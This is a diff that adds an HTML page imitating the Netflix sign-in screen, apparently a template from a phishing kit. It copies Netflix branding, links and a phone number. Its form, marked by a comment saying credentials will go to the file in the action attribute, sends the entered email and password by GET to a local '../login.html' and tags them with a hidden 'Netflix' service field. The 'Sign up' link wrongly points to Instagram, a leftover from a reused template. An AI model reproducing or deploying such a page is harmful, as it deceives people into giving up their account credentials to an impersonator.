@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+
+    <title>Sign in to Netflix</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta name="description" id="description" content="Sign in to Netflix" />
+
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="//fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet" />
+    <link href="netflix.css" rel="stylesheet" />
+
+  </head>
+  <body tabindex="0">
+
+    <!-- form wrapper -->
+    <div class="netflix-wrap">
+
+      <!-- page header -->
+      <header class="netflix-header">
+        <a class="netflix-logo" href="https://www.netflix.com/login">
+          <img src="netflix-logo.svg" alt="Netflix" />
+        </a>
+      </header>
+
+      <!-- form center container -->
+      <main class="netflix-container">
+
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="netflix-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="Netflix" />
+
+          <!-- default heading -->
+          <div class="netflix-heading">
+            <h1>Sign In</h1>
+          </div>
+
+          <!-- username input -->
+          <div class="netflix-input netflix-username">
+            <input type="text" id="_username" name="_username" value="" />
+            <label for="_username">Email or phone number</label>
+          </div>
+
+          <!-- password input -->
+          <div class="netflix-input netflix-password">
+            <input type="password" id="_password" name="_password" value="" />
+            <label for="_password">Password</label>
+          </div>
+
+          <!-- form action button -->
+          <div class="netflix-action">
+            <button class="btn" type="submit">Sign In</button>
+          </div>
+
+          <!-- remember checkbox -->
+          <div class="netflix-remember">
+            <label class="netflix-checkbox">
+              <input type="checkbox" name="_remember" checked />
+              <span>Remember me</span>
+            </label>
+            <div class="netflix-help">
+              <a href="https://www.netflix.com/LoginHelp">Need help?</a>
+            </div>
+          </div>
+
+          <!-- signup button -->
+          <div class="netflix-options">
+            <div class="netflix-facebook-login">
+              <img src="facebook-icon.svg" alt="Facebook" />
+              <a href="#">Log in with Facebook</a>
+            </div>
+            <div class="netflix-signup">
+              <span>New to Netflix?</span>
+              <a href="https://www.instagram.com/accounts/usernamesignup/">Sign up now</a>.
+            </div>
+          </div>
+
+        </form>
+
+      </main>
+
+      <!-- form footer links -->
+      <footer class="netflix-footer">
+        <div class="netflix-footer-container">
+
+          <div class="netflix-footer-top">
+            Questions? Call <a href="tel:1-866-579-7172">1-866-579-7172</a>
+          </div>
+
+          <ul class="netflix-footer-links">
+            <li><a href="/giftterms">Gift Card Terms</a></li>
+            <li><a href="https://help.netflix.com/legal/termsofuse">Terms of Use</a></li>
+            <li><a href="https://help.netflix.com/legal/privacy">Privacy Statement</a></li>
+          </ul>
+
+          <div class="netflix-footer-lang">
+            <select>
+              <option value="en">English</option>
+            </select>
+          </div>
+
+        </div>
+      </footer>
+
+    </div>
+
+    <!-- form scripts -->
+    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
+    <script src="netflix.js"></script>
+
+  </body>
+</html>
